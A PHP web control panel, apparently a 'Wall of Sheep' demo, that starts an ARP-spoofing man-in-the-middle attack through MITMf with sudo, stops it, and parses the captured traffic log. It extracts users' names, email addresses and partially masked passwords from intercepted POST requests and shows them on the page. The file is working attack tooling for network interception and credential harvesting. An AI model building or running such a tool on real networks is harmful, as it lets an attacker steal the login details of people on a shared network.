<html>
<head>
<meta http-equiv="refresh" content="5">
</head>
<body>

<form method="POST" action=''>
Interface: <input type="text" name ="interface">
<input type = submit name='ARP' value = "Start ARP">
</form> 
Status: <?php
$return = "ps aux | grep '[/]mitmf' | awk '{print $8}'";
exec($return,$op);

if($op[0] == "S" && $op[1] == "Sl"){ echo "Programm running";}
elseif($op[0] == "S" && $op[1] == "R"){echo "Programm launching";}

else{echo "service not running";}

?>

</br>

<form method="GET" action=''>

<input type = submit name='LOG' value = "GET LOG">
</br>
<input type = submit name='STOP' value = "STOP">

</form> 

</body>
<?php 

$filename = '/var/www/html/logfile.log';
$mitmffile = '/usr/share/mitmf/logs/mitmf.log';

$stop = "sudo kill $(ps aux | grep '[m]itmf' | awk '{print $2}')";




if(isset($_GET['LOG']))
{
WallofSheep($filename);

}

if(isset($_POST['ARP']))
{
runHack();
}
if(isset($_GET['STOP']))
{
exec($stop);
}

function WallofSheep($filename){

if(file_exists($filename))
{
exec("rm logfile.log");

}

exec("cp /usr/share/mitmf/logs/mitmf.log logfile.log");
exec('cat logfile.log | grep "POST\|pass" | tee "pass2.txt"');

$content = file("pass2.txt");
better($content);

}

function better($content){

foreach($content as $test)
{
if(strpos($test,"email")!== FALSE)
{
emailinfo($test);
}
else {
if(strpos($test,"POST")!== FALSE)
{
echo "<br>". $test;
}
else{
userinfo($test);
}
}
}
}

function userinfo($string){

$raw = explode("name",$string); 
$raw2 = explode("=",$raw[1]);
$name = explode("&",$raw2[1]);

$raw = explode("pass",$string); 
$raw2 = explode("=",$raw[1]);
$length = strlen($raw2[1]) - 1;
if(strpos($raw2[1],"&")!== FALSE)
{
$raw2 = explode("&",$raw[1]);
$raw2 = explode("=",$raw2[0]);
$raw2[1]= $raw2[1];
$length = strlen($raw2[1]);

}
$pass = str_pad(substr($raw2[1],0,2),$length,"*");
echo "<br>----------<br>";

echo "Gebruiker:". $name[0] ."<br>";
echo "passwoord:". $pass ."<br>";

echo "<br>----------<br>";

}

function emailinfo($string)
{
$raw = explode("email",$string);
$raw2 = explode("&",$raw[1]);
$raw3 = explode("=",$raw2[0]); //searching for email
$email = str_replace("%40","@",$raw3[1]);

$raw = explode("pass",$string);// searching for password
$raw2 = explode("=",$raw[1]); 
$raw3 = explode("&",$raw2[1]);
$length = strlen($raw3[0]);
$pass = str_pad(substr($raw3[0],0,2),$length,"*");

echo "<br>----------<br>";
echo "email: " .$email."<br>";
echo "passwoord: " .$pass."<br>";
echo "<br>----------<br>";
 
}

function runHack()
{
exec('route -n | cut -d" " -f10',$test);
$default = $test[2];
if(file_exists("/usr/share/mitmf/logs/mitmf.log"))
{
shell_exec("sudo rm /usr/share/mitmf/logs/mitmf.log");
}
$command = 'sudo mitmf -i eth0 --gateway '.$default.' --spoof --arp';
shell_exec($command);
}



?> 

</html>